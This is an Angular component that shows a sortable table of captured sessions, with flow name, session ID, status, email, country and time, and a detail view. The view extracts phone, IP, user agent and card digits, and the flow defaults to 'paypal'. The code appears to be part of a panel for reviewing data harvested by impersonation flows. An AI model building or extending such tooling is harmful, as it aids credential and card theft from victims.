
import { Component, inject, computed, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { StateService } from '../../services/state.service';
import { getFlowById } from '../../services/flows.service';
import { SessionDetailComponent } from '../ui/session-detail.component';

@Component({
  selector: 'app-sessions-view',
  standalone: true,
  imports: [CommonModule, SessionDetailComponent],
  template: `
    <div class="p-6 relative">
      <div class="flex justify-between items-center mb-6">
        <h2 class="text-xl font-bold text-white">Session History</h2>
        <div class="text-xs text-slate-500">
            Showing latest {{ sortedSessions().length }} sessions
        </div>
      </div>

      <div class="bg-[#12121a] border border-[#2e2e3a] rounded-xl overflow-hidden">
        <table class="w-full text-left border-collapse">
          <thead>
            <tr class="bg-[#1a1a24] text-slate-400 text-xs uppercase tracking-wider">
              <th class="p-4 font-semibold">Flow</th>
              <th class="p-4 font-semibold">Session ID</th>
              <th class="p-4 font-semibold">Status</th>
              <th class="p-4 font-semibold">Details</th>
              <th class="p-4 font-semibold">Time</th>
              <th class="p-4 font-semibold text-right">Actions</th>
            </tr>
          </thead>
          <tbody class="divide-y divide-[#2e2e3a]">
            @for (session of sortedSessions(); track session.id) {
              <tr class="hover:bg-[#1a1a24]/50 transition-colors cursor-pointer" (click)="viewSession(session)">
                <td class="p-4">
                  <div class="flex items-center gap-2">
                    <span class="text-lg">{{ getFlowIcon(session.data?.flowId) }}</span>
                    <span class="text-sm text-slate-300">{{ getFlowName(session.data?.flowId) }}</span>
                  </div>
                </td>
                <td class="p-4">
                    <span class="font-mono text-xs text-slate-400">{{ session.id }}</span>
                </td>
                <td class="p-4">
                    <span class="px-2 py-1 rounded text-xs font-medium" 
                        [class.bg-green-500-10]="session.status === 'Verified' || session.isFlowComplete"
                        [class.text-green-400]="session.status === 'Verified' || session.isFlowComplete"
                        [class.bg-blue-500-10]="session.status === 'Active'"
                        [class.text-blue-400]="session.status === 'Active'">
                        {{ session.status || (session.isFlowComplete ? 'Verified' : 'Active') }}
                    </span>
                </td>
                <td class="p-4 text-xs text-slate-400">
                    <div>{{ session.data?.email || 'No Email' }}</div>
                    <div>{{ session.data?.ipCountry || 'Unknown' }}</div>
                </td>
                <td class="p-4 text-xs text-slate-500">
                    {{ session.timestamp | date:'short' }}
                </td>
                <td class="p-4 text-right">
                    <button (click)="$event.stopPropagation(); viewSession(session)" class="text-indigo-400 hover:text-indigo-300 text-xs border border-indigo-400/30 px-2 py-1 rounded">
                        View Log
                    </button>
                </td>
              </tr>
            }
            @if (sortedSessions().length === 0) {
                <tr>
                    <td colspan="6" class="p-8 text-center text-slate-500">
                        No active sessions found.
                    </td>
                </tr>
            }
          </tbody>
        </table>
      </div>

      @if (selectedSession()) {
          <app-session-detail 
              [session]="selectedSessionData()" 
              (closed)="closeSession()"
          />
      }
    </div>
  `
})
export class SessionsViewComponent {
  private state = inject(StateService);

  selectedSession = signal<any>(null);

  // Transform selected session to detail format
  selectedSessionData = computed(() => {
    const s = this.selectedSession();
    if (!s) return null;
    return {
      id: s.id,
      flowId: s.data?.flowId || 'paypal',
      status: (s.status?.toLowerCase() || 'active') as any,
      ip: s.data?.ip || 'Unknown',
      userAgent: s.data?.userAgent || 'Unknown',
      location: s.data?.ipCountry || 'Unknown',
      startedAt: new Date(s.timestamp),
      data: {
        email: s.data?.email,
        phone: s.data?.phone,
        cardLast4: s.data?.cardNumber ? s.data.cardNumber.slice(-4) : undefined,
        steps: [] // Todo: Parse steps from logs if available
      }
    };
  });

  sortedSessions = computed(() => {
    return this.state.history().slice().sort((a, b) => {
      return new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime();
    });
  });

  getFlowIcon(id: string) {
    return getFlowById(id)?.icon || '❓';
  }

  getFlowName(id: string) {
    return getFlowById(id)?.name || 'Unknown';
  }

  viewSession(session: any) {
    this.selectedSession.set(session);
  }

  closeSession() {
    this.selectedSession.set(null);
  }
}
